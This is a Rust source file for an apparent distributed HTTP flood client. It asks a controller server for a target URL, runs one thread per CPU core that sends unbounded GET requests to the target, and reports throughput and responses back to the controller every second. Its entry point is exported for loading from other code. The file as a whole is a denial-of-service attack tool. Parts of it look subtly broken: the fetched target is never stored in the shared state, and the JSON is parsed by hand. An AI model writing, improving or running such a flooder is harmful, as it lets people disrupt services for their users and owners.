use serde_json;
use std::sync::{Arc, Condvar};
use std::time;
use dashmap::DashMap;
use shared_mutex::SharedMutex;

struct Client<'a> {
    host_address: String,
    attack_data: Arc<(SharedMutex<(bool, &'a str)>, Condvar)>,
    results: Arc<DashMap<u32, Vec<String>>>,
}

//client methods
impl Client<'_> {
    //constructor
    fn new<'a>(host: String) -> Client<'a> {
        let thread_count = std::thread::available_parallelism().unwrap().get();
        let mut cl = Client {
            host_address: host,
            attack_data: Arc::new((SharedMutex::new((false, "")), Condvar::new())),
            results: Arc::new(DashMap::with_capacity(thread_count)),
        };
        for i in 0..thread_count {
            cl.results.insert(i as u32, vec![]);
        }
        return cl;
    }

    //checks if the server can attack, if it can, it notifies the workers
    fn can_attack(&self) {
        // sends request to the server to check if it can attack
        let url = self.host_address.as_str();
        //parses the result
        let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
            strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1];
        let mut can_attack = !attack_address_url.is_empty();
        let (lock, cv) = &*self.attack_data;
        let mut wlock = lock.write().unwrap();
        let (mut attacking, mut address) = &*wlock;
        address = attack_address_url;
        attacking = can_attack;
        match attacking {
            true => cv.notify_all(),
            false => ()
        };
    }

    fn start_requesting(client: reqwest::blocking::Client, id: u32, address: &str, results: Arc<DashMap<u32, Vec<String>>>, ) {
        let result = client.get(address).send();
        return match result {
            Ok(_) => {
                let res = result.unwrap();
                let code = res.status().as_u16().to_string();
                let body = res.text().unwrap();
                let response_body = serde_json::json!({"code": code, "body":body});
                let local_instance = results.clone();
                local_instance.get_mut(&id).unwrap().push(response_body.to_string());
            }
            Err(_) => {}
        };
    }

    fn thread_worker(attack_data: Arc<(SharedMutex<(bool, &str)>,  Condvar)>, results: Arc<DashMap<u32, Vec<String>>>, id: u32) {
        let client = reqwest::blocking::Client::new();
        let (lock, cv) = &*attack_data;
        //infinite loop todo make it stoppable by some signal
        loop {
            let mut pair = lock.read().unwrap();
            let (attacking, address) = &*pair;
            let addr = address.clone().to_string().to_owned();
            if !attacking {
                pair = pair.wait_for_read(cv).unwrap();
            }
            let mut _r = 0;
            for _ in 0..100 {
                Client::start_requesting(client.clone(), id, addr.as_str(), results.clone());
            }
        }
    }
}

    //main function, starts the threads and the attack and collects info
    fn run() {
        let cl = Client::new(String::from("http://localhost:8080"));
        let attack_data = cl.attack_data.clone();
        let results = cl.results.clone();
        let mut worker_threads: Vec<std::thread::JoinHandle<()>> = vec![];
        let thread_count = std::thread::available_parallelism().unwrap().get();
        worker_threads.reserve(thread_count);
        for i in 0..thread_count {
            let ind = i.to_owned().clone();
            let a = attack_data.clone().to_owned();
            let r = results.clone().to_owned();
            worker_threads.push(std::thread::spawn(move || {
                Client::thread_worker(a, r,ind as u32);
            }));
        }
        cl.can_attack();
        let addr = cl.host_address.to_owned().clone();
        let armap = cl.results.to_owned().clone();
        let handl = std::thread::spawn(move || {
            let time = time::Duration::from_millis(950);
            let cl = reqwest::blocking::Client::new();
            let map = &*armap;
            loop {
                std::thread::sleep(time);
                let mut request_body_vec = Vec::new();
                for el in map.iter() {
                    request_body_vec.extend(el.value().to_owned());
                }
                println!("Throughput: {}", request_body_vec.len());
                if request_body_vec.len() >= 20 {
                    cl.post(format!("{}/attack_info", addr.to_owned().clone())).json(&request_body_vec).send().unwrap();
                    map.alter_all(|_, mut v| {
                        v.clear();
                        v
                    });
                }
            }
        });
        //checks if the server can attack
        // loop {
        //     self.can_attack();
        // }
        //waits for the thread to finish todo make it finishable by some signal
        handl.join().unwrap();
        while worker_threads.len() > 0 {
            let thread = worker_threads.pop().unwrap();
            thread.join().unwrap();
        }
    }


#[no_mangle]
pub extern "C" fn startup() {
    run();
}
